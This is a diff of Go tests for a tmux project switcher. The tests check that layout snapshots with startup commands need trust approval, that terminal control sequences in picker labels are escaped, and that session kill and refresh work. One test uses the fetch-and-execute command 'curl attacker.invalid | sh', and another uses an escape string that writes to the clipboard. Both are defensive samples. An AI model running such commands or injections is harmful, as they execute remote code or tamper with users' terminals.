+}
+
+func TestSwitchProjectOpenNamedSnapshotLayoutDenyStopsBeforeTmuxMutation(t *testing.T) {
+	t.Parallel()
+
+	cmd, executor, project := namedSnapshotTrustTestCommand(t, sessionstate.StartupRecipe("curl attacker.invalid | sh"))
+	executor.layoutAuthorizeSet = true
+	executor.layoutAuthorizeResult = false
+
+	err := cmd.openProjectTarget(context.Background(), project, "workspace")
+	if !errors.Is(err, errProjectTrustDenied) {
+		t.Fatalf("openProjectTarget() error = %v, want trust denied", err)
+	}
+	assertNamedSnapshotTrustStoppedBeforeTmuxMutation(t, executor, project)
+}
+
+func TestSwitchProjectOpenNamedSnapshotLayoutAuthorizationErrorStopsBeforeTmuxMutation(t *testing.T) {
+	t.Parallel()
+
+	cmd, executor, project := namedSnapshotTrustTestCommand(t, sessionstate.StartupRecipe("make watch"))
+	executor.layoutAuthorizeErr = errors.New("trust popup failed")
+
+	err := cmd.openProjectTarget(context.Background(), project, "workspace")
+	var trustErr errProjectTrustGate
+	if !errors.As(err, &trustErr) || !strings.Contains(err.Error(), "trust popup failed") {
+		t.Fatalf("openProjectTarget() error = %v, want trust gate error", err)
+	}
+	assertNamedSnapshotTrustStoppedBeforeTmuxMutation(t, executor, project)
+}
+
+func TestSwitchProjectOpenCommandlessNamedSnapshotSkipsLayoutTrust(t *testing.T) {
+	t.Parallel()
+
+	cmd, executor, project := namedSnapshotTrustTestCommand(t, sessionstate.ShellRecipe())
+	executor.layoutAuthorizeSet = true
+	executor.layoutAuthorizeResult = false
+
+	if err := cmd.openProjectTarget(context.Background(), project, "workspace"); err != nil {
+		t.Fatalf("openProjectTarget() error = %v", err)
+	}
+	if executor.layoutAuthorizeCalled {
+		t.Fatal("commandless named snapshot requested executable trust")
+	}
+	if executor.restoreSessionName != "workspace" || executor.openSessionName != "workspace" {
+		t.Fatalf("commandless restore did not preserve behavior: %#v", executor)
+	}
+}
+
+func TestProjectStartupPickerEscapesProjectOwnedLayoutStrings(t *testing.T) {
+	t.Parallel()
+
+	candidate := projectStartupCandidate{
+		Kind:  projectStartupKindNamed,
+		Name:  "team\x1b]52;c;secret\a",
+		Label: "Named snapshot",
+		Description: namedSnapshotDescription(corelayout.Entry{
+			Name:        "team\x1b[31m",
+			Description: "desc\u009b31m\u009dclipboard",
+			Windows:     1,
+			Panes:       1,
+		}),
+	}
+	options := projectStartupPickerOptions([]projectStartupCandidate{candidate})
+	entry := options.Entries[0]
+	for _, rendered := range []string{entry.Label, entry.SearchKey} {
+		plain := stripAnsi(rendered)
+		if strings.Contains(plain, "\x1b") || strings.Contains(plain, "\a") ||
+			strings.Contains(plain, "\u009b") || strings.Contains(plain, "\u009d") {
+			t.Fatalf("picker rendered project control sequence: %q", rendered)
+		}
+	}
+	if !strings.Contains(entry.Label, `\x1b`) || !strings.Contains(entry.SearchKey, `\x1b`) {
+		t.Fatalf("picker did not visibly escape controls: %#v", entry)
+	}
+}
+
+func namedSnapshotTrustTestCommand(t *testing.T, recipe sessionstate.Recipe) (*switchCommand, *capturingSwitchSessionExecutor, string) {
+	t.Helper()
+	home := t.TempDir()
+	enableSidebarStartupPickerForTest(t, home)
+	project := filepath.Join(home, "workspace")
+	if err := corelayout.NewStore(project).Save("team", corelayout.Preset{
+		SchemaVersion: corelayout.SchemaVersion,
+		Windows: []corelayout.Window{{
+			Index:           0,
+			ActivePaneIndex: 0,
+			Panes: []corelayout.Pane{{
+				Index:  0,
+				CWD:    "${PROJMUX_CWD}",
+				Recipe: recipe,
+			}},
+		}},
+	}); err != nil {
+		t.Fatal(err)
+	}
+	executor := &capturingSwitchSessionExecutor{}
+	runner, native := scriptedPicker(t, []pickerStep{{
+		reply: intpickercompat.Result{Value: projectStartupValueNamed + "team"},
+	}})
+	return &switchCommand{
+		sessions: executor,
+		identity: stubSwitchIdentityResolver{name: "workspace"},
+		homeDir:  func() (string, error) { return home, nil },
+		lookupEnv: func(name string) string {
+			if name == "XDG_CONFIG_HOME" {
+				return filepath.Join(home, "config")
+			}
+			return ""
+		},
+		runner:       runner,
+		nativePicker: native,
+	}, executor, project
+}
+
+func assertNamedSnapshotTrustStoppedBeforeTmuxMutation(t *testing.T, executor *capturingSwitchSessionExecutor, project string) {
+	t.Helper()
+	if got, want := executor.calls, []string{
+		"authorize:" + project,
+		"authorize-layout:.projmux/layouts/team.toml",
+	}; !equalStrings(got, want) {
+		t.Fatalf("calls = %q, want %q; no restore/new-session/split/send-keys/open is allowed", got, want)
+	}
+	if executor.restoreSessionName != "" || executor.ensureSessionName != "" || executor.openSessionName != "" {
+		t.Fatalf("trust failure left partial session state: %#v", executor)
 	}
 }
 
@@ -916,7 +1578,7 @@ func TestSwitchProjectOpenStartupPickerOffCreatesEmptyWithoutPicker(t *testing.T
 	}
 }
 
-func TestSwitchProjectOpenTrustDenyAfterStartupSelectionFallsBackToEmptySession(t *testing.T) {
+func TestSwitchProjectOpenTrustDenyAfterStartupSelectionAbortsWithoutSession(t *testing.T) {
 	t.Parallel()
 
 	home := t.TempDir()
@@ -940,8 +1602,9 @@ func TestSwitchProjectOpenTrustDenyAfterStartupSelectionFallsBackToEmptySession(
 		nativePicker: native,
 	}
 
-	if err := cmd.openProjectTarget(context.Background(), "/tmp/workspace", "workspace"); err != nil {
-		t.Fatalf("openProjectTarget() error = %v", err)
+	err := cmd.openProjectTarget(context.Background(), "/tmp/workspace", "workspace")
+	if !errors.Is(err, errProjectTrustDenied) {
+		t.Fatalf("openProjectTarget() error = %v, want trust denied", err)
 	}
 	if !executor.authorizeCalled {
 		t.Fatal("trust gate was not checked")
@@ -952,21 +1615,15 @@ func TestSwitchProjectOpenTrustDenyAfterStartupSelectionFallsBackToEmptySession(
 	if executor.restoreSessionName != "" {
 		t.Fatalf("snapshot restore ran after deny: restore=%q", executor.restoreSessionName)
 	}
-	if got, want := executor.ensureSessionName, "workspace"; got != want {
-		t.Fatalf("ensure session = %q, want %q", got, want)
+	if executor.ensureSessionName != "" || executor.ensureCWD != "" || executor.openSessionName != "" {
+		t.Fatalf("deny should not create/open a session: %#v", executor)
 	}
-	if got, want := executor.ensureCWD, "/tmp/workspace"; got != want {
-		t.Fatalf("ensure cwd = %q, want %q", got, want)
-	}
-	if got, want := executor.openSessionName, "workspace"; got != want {
-		t.Fatalf("open session = %q, want %q", got, want)
-	}
-	if got, want := executor.calls, []string{"authorize:/tmp/workspace", "ensure:workspace", "open:workspace"}; !equalStrings(got, want) {
+	if got, want := executor.calls, []string{"authorize:/tmp/workspace"}; !equalStrings(got, want) {
 		t.Fatalf("calls = %q, want %q", got, want)
 	}
 }
 
-func TestSwitchProjectOpenTrustDenyWithLatestSnapshotSkipsRestoreAndOpensEmpty(t *testing.T) {
+func TestSwitchProjectOpenTrustDenyWithLatestSnapshotSkipsRestoreAndCreate(t *testing.T) {
 	t.Parallel()
 
 	home := t.TempDir()
@@ -1001,13 +1658,17 @@ func TestSwitchProjectOpenTrustDenyWithLatestSnapshotSkipsRestoreAndOpensEmpty(t
 		nativePicker: native,
 	}
 
-	if err := cmd.openProjectTarget(context.Background(), project, "workspace"); err != nil {
-		t.Fatalf("openProjectTarget() error = %v", err)
+	err := cmd.openProjectTarget(context.Background(), project, "workspace")
+	if !errors.Is(err, errProjectTrustDenied) {
+		t.Fatalf("openProjectTarget() error = %v, want trust denied", err)
 	}
 	if executor.restoreSessionName != "" {
 		t.Fatalf("snapshot restore ran after trust deny: restore=%q", executor.restoreSessionName)
 	}
-	if got, want := executor.calls, []string{"authorize:" + project, "ensure:workspace", "open:workspace"}; !equalStrings(got, want) {
+	if executor.ensureSessionName != "" || executor.openSessionName != "" {
+		t.Fatalf("deny should not create/open a session: %#v", executor)
+	}
+	if got, want := executor.calls, []string{"authorize:" + project}; !equalStrings(got, want) {
 		t.Fatalf("calls = %q, want %q", got, want)
 	}
 }
@@ -1148,6 +1809,7 @@ func TestNewSwitchCommandUsesEnvAndDefaultPinStore(t *testing.T) {
 	cmd.nativePicker = nativePickerFromCompatRunner(fakeRunner)
 	cmd.sessions = fakeExecutor
 	cmd.executable = func() (string, error) { return "/tmp/projmux", nil }
+	cmd.tmuxRunner = &recordingTmuxRunner{}
 
 	var stdout bytes.Buffer
 	var stderr bytes.Buffer
@@ -1162,27 +1824,25 @@ func TestNewSwitchCommandUsesEnvAndDefaultPinStore(t *testing.T) {
 		t.Fatalf("stdout = %q, want %q", got, want)
 	}
 	wantEntries := []intpickercompat.Entry{
-		{Label: "\x1b[1mhome\x1b[0m\n  \x1b[38;5;242m~\x1b[0m", Value: fixture.path("home")},
-		{Label: "\x1b[1mapp\x1b[0m \x1b[33m*\x1b[0m\n  \x1b[38;5;242m" + fixture.path("pins/app") + "\x1b[0m", Value: fixture.path("pins/app")},
-		{Label: "\x1b[1mrepo-a\x1b[0m\n  \x1b[38;5;242m~rp/repo-a\x1b[0m", Value: fixture.path("rp/repo-a")},
-		{Label: "\x1b[1mwork-a\x1b[0m\n  \x1b[38;5;242m" + fixture.path("managed/work-a") + "\x1b[0m", Value: fixture.path("managed/work-a")},
-		{Label: "\x1b[1mwork-b\x1b[0m\n  \x1b[38;5;242m" + fixture.path("managed/work-b") + "\x1b[0m", Value: fixture.path("managed/work-b")},
+		expectedCheapSidebarEntry("home", "~", fixture.path("home"), false),
+		expectedCheapSidebarEntry("app", fixture.path("pins/app"), fixture.path("pins/app"), true),
+		expectedCheapSidebarEntry("repo-a", "~rp/repo-a", fixture.path("rp/repo-a"), false),
+		expectedCheapSidebarEntry("work-a", fixture.path("managed/work-a"), fixture.path("managed/work-a"), false),
+		expectedCheapSidebarEntry("work-b", fixture.path("managed/work-b"), fixture.path("managed/work-b"), false),
 	}
 	if got := fakeRunner.last.Entries; !equalEntries(got, wantEntries) {
 		t.Fatalf("runner entries = %#v, want %#v", got, wantEntries)
 	}
-	if got, want := fakeRunner.last.PreviewCommand, "exec '/tmp/projmux' 'switch' 'preview' '--ui=sidebar' {2}"; got != want {
-		t.Fatalf("runner preview command = %q, want %q", got, want)
+	if got, want := fakeRunner.last.PreviewCommand, ""; got != want {
+		t.Fatalf("runner preview command = %q, want deferred preview", got)
 	}
 	if got, want := fakeRunner.last.PreviewWindow, "down,25%,border-top"; got != want {
-		t.Fatalf("runner preview window = %q, want %q", got, want)
+		t.Fatalf("runner preview window = %q, want reserved deferred preview frame %q", got, want)
 	}
 	if got, want := fakeRunner.last.Bindings, []string{
 		"esc:abort",
 		"ctrl-n:abort",
 		"alt-1:abort",
-		"alt-2:abort",
-		"alt-3:abort",
 		"focus:execute-silent(exec '/tmp/projmux' 'switch' 'sidebar-focus' {2})",
 		"start:pos(4)",
 	}; !equalStrings(got, want) {
@@ -1191,17 +1851,17 @@ func TestNewSwitchCommandUsesEnvAndDefaultPinStore(t *testing.T) {
 	if got, want := fakeRunner.last.UI, switchUISidebar; got != want {
 		t.Fatalf("runner UI = %q, want %q", got, want)
 	}
-	if got, want := fakeRunner.last.Footer, "C-x: kill | M-p: pin"; got != want {
+	if got, want := fakeRunner.last.Footer, "Alt-P: pin project  |  Ctrl-X: kill session"; got != want {
 		t.Fatalf("runner footer = %q, want %q", got, want)
 	}
-	if got, want := fakeExecutor.ensureSessionName, "managed-work-a"; got != want {
-		t.Fatalf("ensure session = %q, want %q", got, want)
+	if got := fakeExecutor.ensureSessionName; got != "" {
+		t.Fatalf("ensure session = %q, want continuation handoff", got)
 	}
-	if got, want := fakeExecutor.ensureCWD, fixture.path("managed/work-a"); got != want {
-		t.Fatalf("ensure cwd = %q, want %q", got, want)
+	if got := fakeExecutor.ensureCWD; got != "" {
+		t.Fatalf("ensure cwd = %q, want continuation handoff", got)
 	}
-	if got, want := fakeExecutor.openSessionName, "managed-work-a"; got != want {
-		t.Fatalf("open session = %q, want %q", got, want)
+	if got := fakeExecutor.openSessionName; got != "" {
+		t.Fatalf("open session = %q, want continuation handoff", got)
 	}
 }
 
@@ -1231,8 +1891,8 @@ func TestNewSwitchCommandDoesNotInferRepoRootFromHomeSourceRepos(t *testing.T) {
 	}
 
 	wantEntries := []intpickercompat.Entry{
-		{Label: "\x1b[1mhome\x1b[0m\n  \x1b[38;5;242m~\x1b[0m", Value: fixture.path("home")},
-		{Label: "\x1b[1mrepos\x1b[0m\n  \x1b[38;5;242m~/source/repos\x1b[0m", Value: fixture.path("home/source/repos")},
+		expectedCheapSidebarEntry("home", "~", fixture.path("home"), false),
+		expectedCheapSidebarEntry("repos", "~/source/repos", fixture.path("home/source/repos"), false),
 	}
 	if got := fakeRunner.last.Entries; !equalEntries(got, wantEntries) {
 		t.Fatalf("runner entries = %#v, want %#v", got, wantEntries)
@@ -1702,6 +2362,103 @@ func TestSwitchCommandSinglePathProjdirRetainsSavedWorkdirs(t *testing.T) {
 	}
 }
 
+func TestDetectGitBranchWithRunnerPreservesNormalAndDetachedPaths(t *testing.T) {
+	t.Parallel()
+
+	t.Run("symbolic ref", func(t *testing.T) {
+		t.Parallel()
+		var calls [][]string
+		got := detectGitBranchWithRunner("/repo", time.Second, func(_ context.Context, name string, args ...string) ([]byte, error) {
+			calls = append(calls, append([]string{name}, args...))
+			return []byte("main\n"), nil
+		})
+		if got != "main" {
+			t.Fatalf("detectGitBranchWithRunner() = %q, want main", got)
+		}
+		want := [][]string{{"git", "-C", "/repo", "symbolic-ref", "--quiet", "--short", "HEAD"}}
+		if !reflect.DeepEqual(calls, want) {
+			t.Fatalf("calls = %#v, want %#v", calls, want)
+		}
+	})
+
+	t.Run("detached head", func(t *testing.T) {
+		t.Parallel()
+		var calls [][]string
+		got := detectGitBranchWithRunner("/repo", time.Second, func(_ context.Context, name string, args ...string) ([]byte, error) {
+			calls = append(calls, append([]string{name}, args...))
+			if slices.Contains(args, "symbolic-ref") {
+				return nil, errors.New("detached")
+			}
+			return []byte("abc1234\n"), nil
+		})
+		if got != "abc1234" {
+			t.Fatalf("detectGitBranchWithRunner() = %q, want abc1234", got)
+		}
+		want := [][]string{
+			{"git", "-C", "/repo", "symbolic-ref", "--quiet", "--short", "HEAD"},
+			{"git", "-C", "/repo", "rev-parse", "--short", "HEAD"},
+		}
+		if !reflect.DeepEqual(calls, want) {
+			t.Fatalf("calls = %#v, want %#v", calls, want)
+		}
+	})
+}
+
+func TestSwitchFullRowRenderDoesNotBlockOnSlowGitRepository(t *testing.T) {
+	t.Parallel()
+
+	const branchLimit = 20 * time.Millisecond
+	active := 0
+	var slowDeadlines []time.Time
+	gitBranch := func(path string) string {
+		return detectGitBranchWithRunner(path, branchLimit, func(ctx context.Context, _ string, args ...string) ([]byte, error) {
+			if slices.Contains(args, "/slow") {
+				deadline, ok := ctx.Deadline()
+				if !ok {
+					t.Fatal("slow git context has no deadline")
+				}
+				slowDeadlines = append(slowDeadlines, deadline)
+				active++
+				defer func() { active-- }()
+				<-ctx.Done()
+				return nil, ctx.Err()
+			}
+			return []byte("main\n"), nil
+		})
+	}
+	cmd := &switchCommand{
+		pinStore:  func() (switchPinStore, error) { return &stubSwitchPinStore{}, nil },
+		sessions:  &bulkSwitchSessionExecutor{existing: map[string]bool{}},
+		inventory: &stubPreviewInventory{},
+		identity:  switchIdentityResolverFunc(func(path string) (string, error) { return filepath.Base(path), nil }),
+		homeDir:   func() (string, error) { return "/home/tester", nil },
+		lookupEnv: func(string) string { return "" },
+		gitBranch: gitBranch,
+	}
+
+	start := time.Now()
+	_, items, _, err := cmd.renderFullRows(context.Background(), switchUISidebar, []string{"/slow", "/fast"})
+	if err != nil {
+		t.Fatalf("renderFullRows() error = %v", err)
+	}
+	if elapsed := time.Since(start); elapsed > time.Second {
+		t.Fatalf("renderFullRows() elapsed = %v, want bounded slow-repo enrichment", elapsed)
+	}
+	if active != 0 {
+		t.Fatalf("active hanging git runners = %d, want 0 after timeout", active)
+	}
+	if len(slowDeadlines) != 2 || !slowDeadlines[0].Equal(slowDeadlines[1]) {
+		t.Fatalf("slow git deadlines = %v, want one shared deadline for branch and detached-head probes", slowDeadlines)
+	}
+	if got := len(items); got != 2 {
+		t.Fatalf("item count = %d, want 2", got)
+	}
+	labels := items[0].EffectiveLabel() + "\n" + items[1].EffectiveLabel()
+	if !strings.Contains(labels, "main") {
+		t.Fatalf("rendered labels = %q, want normal repository branch", labels)
+	}
+}
+
 func TestSwitchCommandPreviewRendersExistingSessionContext(t *testing.T) {
 	t.Parallel()
 
@@ -2045,6 +2802,7 @@ func TestSwitchCommandPickerCtrlXSwitchesToPreviousActiveSessionBeforeKill(t *te
 		},
 		recentSessions: []string{"tmp-app", "tmp-previous"},
 	}
+	var cleaned []string
 
 	observe := func(o intpickercompat.Options) { gotRunnerOptions = append(gotRunnerOptions, o) }
 	runner, native := scriptedPicker(t, []pickerStep{
@@ -2073,6 +2831,9 @@ func TestSwitchCommandPickerCtrlXSwitchesToPreviousActiveSessionBeforeKill(t *te
 		validate:   func(string) error { return nil },
 		homeDir:    func() (string, error) { return "/home/tester", nil },
 		workingDir: func() (string, error) { return "/tmp", nil },
+		cleanupKilledSession: func(sessionName string) {
+			cleaned = append(cleaned, sessionName)
+		},
 	}
 
 	var stdout bytes.Buffer
@@ -2095,6 +2856,9 @@ func TestSwitchCommandPickerCtrlXSwitchesToPreviousActiveSessionBeforeKill(t *te
 	}
 	if got, want := executor.killSessionName, "tmp-app"; got != want {
 		t.Fatalf("kill session = %q, want %q", got, want)
+	}
+	if got, want := cleaned, []string{"tmp-app"}; !reflect.DeepEqual(got, want) {
+		t.Fatalf("cleaned sessions = %q, want %q", got, want)
 	}
 	if got, want := executor.openSessionName, "tmp-previous"; got != want {
 		t.Fatalf("fallback open session = %q, want %q", got, want)
@@ -2170,6 +2934,238 @@ func TestSwitchCommandPickerCtrlXDoesNotKillHome(t *testing.T) {
 	}
 	if got := executor.killSessionName; got != "" {
 		t.Fatalf("kill session called unexpectedly: %q", got)
+	}
+}
+
+func TestSwitchCommandPickerSidebarKillMutatesNativePickerAndRefreshesRows(t *testing.T) {
+	t.Parallel()
+
+	executor := &capturingSwitchSessionExecutor{
+		exists: map[string]bool{
+			"tmp-app":      true,
+			"tmp-previous": true,
+			"tmp-worker":   true,
+		},
+		recentSessions: []string{"tmp-app", "tmp-previous", "tmp-worker"},
+	}
+	executor.killHook = func(sessionName string) {
+		executor.exists[sessionName] = false
+	}
+
+	var nativeCalls int
+	var mutateCalls int
+	cmd := &switchCommand{
+		discover: func(candidates.Inputs) ([]string, error) {
+			return []string{"/tmp/app", "/tmp/previous", "/tmp/worker"}, nil
+		},
+		pinStore: func() (switchPinStore, error) { return &stubSwitchPinStore{}, nil },
+		nativePicker: pickerRunnerFunc(func(options intpicker.Options) (intpicker.Result, error) {
+			nativeCalls++
+			if options.UI != switchUISidebar {
+				t.Fatalf("native UI = %q, want %q", options.UI, switchUISidebar)
+			}
+			var killAction intpicker.Action
+			for _, action := range options.Actions {
+				if action.Key == switchKillExpectKey {
+					killAction = action
+					break
+				}
+			}
+			if killAction.Mutate == nil {
+				t.Fatalf("kill action = %#v, want mutable native action", killAction)
+			}
+			update, err := killAction.Mutate(intpicker.ActionContext{
+				Key:           switchKillExpectKey,
+				Value:         "/tmp/app",
+				SelectedIndex: 0,
+			})
+			if err != nil {
+				t.Fatalf("kill mutate error = %v", err)
+			}
+			mutateCalls++
+			values := pickerItemValues(update.Items)
+			if !slices.Contains(values, "/tmp/app") {
+				t.Fatalf("refreshed values = %q, want killed project path preserved as normal candidate", values)
+			}
+			if !slices.Contains(values, "/tmp/previous") || !slices.Contains(values, "/tmp/worker") {
+				t.Fatalf("refreshed values = %q, want normal neighboring rows", values)
+			}
+			if update.Preview.Command == "" {
+				t.Fatal("refreshed preview command is empty")
+			}
+			if got, want := update.Preview.Window, switchPreviewWindow(switchUISidebar); got != want {
+				t.Fatalf("refreshed preview window = %q, want %q", got, want)
+			}
+			return intpicker.Result{Closed: true}, nil
+		}),
+		sessions:   executor,
+		executable: func() (string, error) { return "/tmp/projmux", nil },
+		identity: switchIdentityResolverFunc(func(path string) (string, error) {
+			switch path {
+			case "/tmp/app":
+				return "tmp-app", nil
+			case "/tmp/previous":
+				return "tmp-previous", nil
+			case "/tmp/worker":
+				return "tmp-worker", nil
+			default:
+				return "", errors.New("unexpected path")
+			}
+		}),
+		validate:   func(string) error { return nil },
+		homeDir:    func() (string, error) { return "/home/tester", nil },
+		workingDir: func() (string, error) { return "/tmp", nil },
+	}
+
+	if err := cmd.Run([]string{"--ui=sidebar"}, &bytes.Buffer{}, &bytes.Buffer{}); err != nil {
+		t.Fatalf("Run() error = %v", err)
+	}
+	if nativeCalls != 1 {
+		t.Fatalf("native calls = %d, want 1 in-place picker session", nativeCalls)
+	}
+	if mutateCalls != 1 {
+		t.Fatalf("mutate calls = %d, want 1", mutateCalls)
+	}
+	if got, want := executor.calls, []string{"open:tmp-previous", "kill:tmp-app"}; !equalStrings(got, want) {
+		t.Fatalf("session calls = %q, want %q", got, want)
+	}
+	if got, want := cmd.focusSession, "tmp-previous"; got != want {
+		t.Fatalf("focus session = %q, want %q", got, want)
+	}
+}
+
+func TestSwitchCommandPickerSidebarKillRefreshFocusesActiveSession(t *testing.T) {
+	t.Parallel()
+
+	executor := &capturingSwitchSessionExecutor{
+		exists: map[string]bool{
+			"tmp-app":      true,
+			"tmp-previous": true,
+			"tmp-worker":   true,
+		},
+		recentSessions: []string{"tmp-app", "tmp-previous", "tmp-worker"},
+	}
+	executor.killHook = func(sessionName string) {
+		executor.exists[sessionName] = false
+	}
+
+	var focusValue string
+	cmd := &switchCommand{
+		discover: func(candidates.Inputs) ([]string, error) {
+			return []string{"/tmp/app", "/tmp/previous", "/tmp/worker"}, nil
+		},
+		pinStore: func() (switchPinStore, error) { return &stubSwitchPinStore{}, nil },
+		nativePicker: pickerRunnerFunc(func(options intpicker.Options) (intpicker.Result, error) {
+			var killAction intpicker.Action
+			for _, action := range options.Actions {
+				if action.Key == switchKillExpectKey {
+					killAction = action
+					break
+				}
+			}
+			if killAction.Mutate == nil {
+				t.Fatalf("kill action = %#v, want mutable native action", killAction)
+			}
+			update, err := killAction.Mutate(intpicker.ActionContext{
+				Key:           switchKillExpectKey,
+				Value:         "/tmp/app",
+				SelectedIndex: 0,
+			})
+			if err != nil {
+				t.Fatalf("kill mutate error = %v", err)
+			}
+			focusValue = update.FocusValue
+			return intpicker.Result{Closed: true}, nil
+		}),
+		sessions:   executor,
+		executable: func() (string, error) { return "/tmp/projmux", nil },
+		identity: switchIdentityResolverFunc(func(path string) (string, error) {
+			switch path {
+			case "/tmp/app":
+				return "tmp-app", nil
+			case "/tmp/previous":
+				return "tmp-previous", nil
+			case "/tmp/worker":
+				return "tmp-worker", nil
+			default:
+				return "", errors.New("unexpected path")
+			}
+		}),
+		validate:   func(string) error { return nil },
+		homeDir:    func() (string, error) { return "/home/tester", nil },
+		workingDir: func() (string, error) { return "/tmp", nil },
+	}
+
+	if err := cmd.Run([]string{"--ui=sidebar"}, &bytes.Buffer{}, &bytes.Buffer{}); err != nil {
+		t.Fatalf("Run() error = %v", err)
+	}
+	// After the kill tmux switches to tmp-previous; the refresh must point
+	// FocusValue at that session's row path so the sidebar cursor follows.
+	if got, want := cmd.focusSession, "tmp-previous"; got != want {
+		t.Fatalf("focus session = %q, want %q", got, want)
+	}
+	if got, want := focusValue, "/tmp/previous"; got != want {
+		t.Fatalf("refresh FocusValue = %q, want active session path %q", got, want)
+	}
+}
+
+func TestSwitchCommandPickerSidebarKillMutateBlocksWithoutPreviousLiveSession(t *testing.T) {
+	t.Parallel()
+
+	executor := &capturingSwitchSessionExecutor{
+		exists:         map[string]bool{"tmp-app": true},
+		recentSessions: []string{"tmp-app"},
+	}
+	var mutateCalls int
+	cmd := &switchCommand{
+		discover: func(candidates.Inputs) ([]string, error) {
+			return []string{"/tmp/app"}, nil
+		},
+		pinStore: func() (switchPinStore, error) { return &stubSwitchPinStore{}, nil },
+		nativePicker: pickerRunnerFunc(func(options intpicker.Options) (intpicker.Result, error) {
+			var killAction intpicker.Action
+			for _, action := range options.Actions {
+				if action.Key == switchKillExpectKey {
+					killAction = action
+					break
+				}
+			}
+			if killAction.Mutate == nil {
+				t.Fatalf("kill action = %#v, want mutable native action", killAction)
+			}
+			update, err := killAction.Mutate(intpicker.ActionContext{
+				Key:           switchKillExpectKey,
+				Value:         "/tmp/app",
+				SelectedIndex: 0,
+			})
+			if err != nil {
+				t.Fatalf("kill mutate error = %v", err)
+			}
+			mutateCalls++
+			if values := pickerItemValues(update.Items); !slices.Contains(values, "/tmp/app") {
+				t.Fatalf("refreshed values = %q, want blocked kill row preserved", values)
+			}
+			return intpicker.Result{Closed: true}, nil
+		}),
+		sessions:   executor,
+		executable: func() (string, error) { return "/tmp/projmux", nil },
+		identity:   stubSwitchIdentityResolver{name: "tmp-app"},
+		validate:   func(string) error { return nil },
+		homeDir:    func() (string, error) { return "/home/tester", nil },
+		workingDir: func() (string, error) { return "/tmp", nil },
+	}
+
+	if err := cmd.Run([]string{"--ui=sidebar"}, &bytes.Buffer{}, &bytes.Buffer{}); err != nil {
+		t.Fatalf("Run() error = %v", err)
+	}
+	if mutateCalls != 1 {
+		t.Fatalf("mutate calls = %d, want 1", mutateCalls)
+	}
+	if got := executor.killSessionName; got != "" {
+		t.Fatalf("kill session called unexpectedly: %q", got)
+	}
+	if got := executor.openSessionName; got != "" {
+		t.Fatalf("open session called unexpectedly: %q", got)
 	}
 }
 
@@ -2524,27 +3520,107 @@ func (f pickerRunnerFunc) Run(options intpicker.Options) (intpicker.Result, erro
 }
 
 type capturingSwitchSessionExecutor struct {
-	ensureSessionName  string
-	ensureCWD          string
-	openSessionName    string
-	killSessionName    string
-	restoreSessionName string
-	restoreCWD         string
-	restoreSource      string
-	restoreSnapshot    sessionstate.Snapshot
-	authorizeCalled    bool
-	authorizeResult    bool
-	authorizeSet       bool
-	exists             map[string]bool
-	recentSessions     []string
-	calls              []string
-	ensureErr          error
-	openErr            error
-	killErr            error
-	restoreErr         error
-	authorizeErr       error
-	existsErr          error
-	recentErr          error
+	ensureSessionName     string
+	ensureCWD             string
+	openSessionName       string
+	killSessionName       string
+	restoreSessionName    string
+	restoreCWD            string
+	restoreSource         string
+	restoreSnapshot       sessionstate.Snapshot
+	authorizeCalled       bool
+	authorizeResult       bool
+	authorizeSet          bool
+	layoutAuthorizeCalled bool
+	layoutAuthorizeResult bool
+	layoutAuthorizeSet    bool
+	exists                map[string]bool
+	recentSessions        []string
+	calls                 []string
+	killHook              func(string)
+	ensureErr             error
+	openErr               error
+	killErr               error
+	restoreErr            error
+	authorizeErr          error
+	layoutAuthorizeErr    error
+	existsErr             error
+	recentErr             error
+}
+
+type bulkSwitchSessionExecutor struct {
+	existing    map[string]bool
+	bulkErr     error
+	bulkCalls   int
+	existsCalls []string
+}
+
+type sidebarOpenTrustPopupExecutor struct {
+	lookupEnv   func(string) string
+	executable  func() (string, error)
+	popupRunner tmuxRunner
+	calls       []string
+}
+
+func (e *bulkSwitchSessionExecutor) EnsureSession(context.Context, string, string) error {
+	return nil
+}
+
+func (e *bulkSwitchSessionExecutor) OpenSession(context.Context, string) error {
+	return nil
+}
+
+func (e *bulkSwitchSessionExecutor) ExistingSessions(context.Context) (map[string]bool, error) {
+	e.bulkCalls++
+	if e.bulkErr != nil {
+		return nil, e.bulkErr
+	}
+	existing := make(map[string]bool, len(e.existing))
+	maps.Copy(existing, e.existing)
+	return existing, nil
+}
+
+func (e *bulkSwitchSessionExecutor) SessionExists(_ context.Context, sessionName string) (bool, error) {
+	e.existsCalls = append(e.existsCalls, sessionName)
+	return e.existing[sessionName], nil
+}
+
+func (e *sidebarOpenTrustPopupExecutor) EnsureSession(_ context.Context, sessionName, _ string) error {
+	e.calls = append(e.calls, "ensure:"+sessionName)
+	return nil
+}
+
+func (e *sidebarOpenTrustPopupExecutor) OpenSession(_ context.Context, sessionName string) error {
+	e.calls = append(e.calls, "open:"+sessionName)
+	return nil
+}
+
+func (e *sidebarOpenTrustPopupExecutor) SessionExists(context.Context, string) (bool, error) {
+	return false, nil
+}
+
+func (e *sidebarOpenTrustPopupExecutor) AuthorizeProjectHooks(_ context.Context, cwd string) (bool, error) {
+	e.calls = append(e.calls, "authorize:"+cwd)
+	prompt := tmuxProjectHookPrompt(e.lookupEnv, e.executable, e.popupRunner)
+	decision := prompt(hooks.ProjectHookPromptRequest{
+		RepoPath:     cwd,
+		RelativePath: ".projmux/config.toml",
+		SHA256:       "abc123",
+	})
+	return decision != hooks.ProjectHookDeny, nil
+}
+
+func (e *sidebarOpenTrustPopupExecutor) AuthorizeProjectLayout(_ context.Context, cwd string, artifact corelayout.Artifact) (bool, error) {
+	e.calls = append(e.calls, "authorize-layout:"+artifact.RelativePath)
+	prompt := tmuxProjectHookPrompt(e.lookupEnv, e.executable, e.popupRunner)
+	decision := prompt(hooks.ProjectHookPromptRequest{
+		RepoPath:     cwd,
+		RelativePath: artifact.RelativePath,
+		ArtifactKind: "project layout",
+		SHA256:       "abc123",
+		Preview:      strings.Join(artifact.ExecutableCommands(), "\n"),
+	})
+	return decision != hooks.ProjectHookDeny, nil
 }
 
 func (e *capturingSwitchSessionExecutor) EnsureSession(_ context.Context, sessionName, cwd string) error {
@@ -2563,7 +3639,13 @@ func (e *capturingSwitchSessionExecutor) OpenSession(_ context.Context, sessionN
 func (e *capturingSwitchSessionExecutor) KillSession(_ context.Context, sessionName string) error {
 	e.killSessionName = sessionName
 	e.calls = append(e.calls, "kill:"+sessionName)
-	return e.killErr
+	if e.killErr != nil {
+		return e.killErr
+	}
+	if e.killHook != nil {
+		e.killHook(sessionName)
+	}
+	return nil
 }
 
 func (e *capturingSwitchSessionExecutor) AuthorizeProjectHooks(_ context.Context, cwd string) (bool, error) {
